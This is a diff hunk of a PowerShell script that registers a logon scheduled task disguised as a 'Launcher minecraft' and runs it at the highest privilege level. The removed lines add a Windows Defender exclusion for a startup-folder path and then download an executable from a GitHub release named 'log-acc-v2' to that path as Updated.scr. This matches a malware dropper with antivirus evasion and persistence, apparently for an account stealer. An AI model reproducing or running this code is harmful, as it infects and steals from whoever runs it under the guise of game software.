@@ -17,12 +17,3 @@ $task_trigger = New-ScheduledTaskTrigger -AtLogOn
 $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
 Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Launcher minecraft" -RunLevel Highest -Force
 
-
-$url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/stub.exe"
-$output = "$startupfolder\Updated.scr"
-Add-MpPreference -ExclusionPath $output
-if (Test-Path -Path $output) {
-    Write-Host "hello"
-} else {
-    Invoke-WebRequest -Uri $url -OutFile $output
-}
